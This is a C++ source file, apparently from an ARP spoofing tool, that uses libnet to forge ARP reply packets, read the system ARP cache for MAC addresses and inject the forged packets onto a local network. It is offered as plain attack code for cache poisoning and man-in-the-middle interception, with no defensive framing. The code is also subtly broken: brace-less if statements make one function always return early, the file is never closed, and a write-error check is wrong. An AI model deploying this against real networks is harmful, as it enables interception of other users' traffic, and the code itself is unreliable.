#include "arpspoof.hpp"


short killua::arp_packet( libnet_t *ltag, struct arp_ctx *ctx, 
                         char *errbuf )
{
    libnet_ptag_t ether, arp;

    arp = libnet_autobuild_arp(
        ARPOP_REPLY,
        ctx->src_hw,
        ctx->src_ip,
        ctx->dst_hw,
        ctx->dst_ip,
        ltag
    );
    if ( arp < 0 )
        sprintf( errbuf, "%s", "Arp header error!" );
        return -1;
    
    ether = libnet_autobuild_ethernet(
        ctx->dst_hw,
        ETHERTYPE_ARP,
        ltag
    );
    if ( ether < 0 )
        sprintf( errbuf, "%s", "Ethernet header error!" );
        return -1;
}

struct arp_ctx * killua::format_arp( libnet_t *ltag, uint8_t *src_hw,
                                     uint8_t *src_ip,
                                     uint8_t *dst_hw,
                                     uint8_t *dst_ip )
{
    static struct arp_ctx ctx;
    
    memcpy( ctx.dst_hw, dst_hw, 6);
    memcpy( ctx.dst_ip, dst_ip, 4);
    memcpy( ctx.src_hw, src_hw, 6);
    memcpy( ctx.src_ip, src_ip, 4);
    return &ctx;
}

short killua::lookup_arp( char *ip, uint8_t *hw )
{
    FILE *fp;
    char line[0xFF];
    char addr[20];
    char hwtype[5];
    char flags[5];
    char hwaddr[25];
    char mask[5];
    char dev[25];

    if ( !(fp = fopen( ARP_CACHE, "r" )) ){
        return -1;
    }
    while ( fgets( line, 0xFF, fp ) ){
        sscanf( line, "%s %s %s %s %s %s", addr, hwtype, flags, hwaddr, mask, dev );
        if ( strcmp( addr, ip ) == 0 ) {
            break;
        }
    }
    fseek( fp, 0, SEEK_SET );
    if ( strlen( hwaddr ) > 0 && is_hw_format( hwaddr ) == 0 ) {
        cnvrt_hw2b( hwaddr, hw );
        return 0;
    }
    return -1;
}

int killua::inject_arp( libnet_t *ltag )
{
    int lpstat;
    if ( !(lpstat = libnet_write( ltag )) ){
        libnet_clear_packet( ltag );
        return -1;
    }
    return 0;
}